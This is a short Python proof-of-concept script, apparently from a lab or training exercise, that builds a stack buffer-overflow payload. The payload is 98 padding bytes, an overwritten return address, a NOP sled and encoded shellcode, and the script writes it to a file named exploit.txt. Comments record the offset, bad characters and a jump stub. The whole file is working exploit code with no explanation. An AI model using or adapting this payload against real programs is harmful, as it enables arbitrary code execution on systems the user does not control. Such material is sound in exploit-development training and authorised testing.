#!/usr/bin/env python3
import socket
import sys
from struct import pack

# POC buffer

OFFSET = 98 
#stack at 102
#first_stage= "\x83\xC0\x0C\xFF\xE0"
#eip= \x5e\x51\x9a\x5e" 0x5e9a515e
#POC buffer
#bad_char=\x0a\x0d\x1a\x20\x43\x75\x9e\xbc
#buf = A*Offset + EIP + NOP + Shell 
buf = b"A" * OFFSET + b"\x5e\x51\x9a\x5e"
buf += b"\x90" *16
buf +=  b""
buf += b"\xda\xd6\xbf\x85\x18\x54\x2a\xd9\x74\x24\xf4\x5b"
buf += b"\x2b\xc9\xb1\x12\x83\xeb\xfc\x31\x7b\x13\x03\xfe"
buf += b"\x0b\xb6\xdf\x31\xf7\xc1\xc3\x62\x44\x7d\x6e\x86"
buf += b"\xc3\x60\xde\xe0\x1e\xe2\x8c\xb5\x10\xdc\x7f\xc5"
buf += b"\x18\x5a\x79\xad\x5a\x34\x54\xf0\x33\x47\xa7\x0b"
buf += b"\x7f\xce\x46\xbb\x19\x81\xd9\xe8\x56\x22\x53\xef"
buf += b"\x54\xa5\x31\x87\x08\x89\xc6\x3f\xbd\xfa\x07\xdd"
buf += b"\x54\x8c\xbb\x73\xf4\x07\xda\xc3\xf1\xda\x9d"


f = open("/home/kali/Downloads/exploit.txt", "wb")
f.write(buf)
f.close()


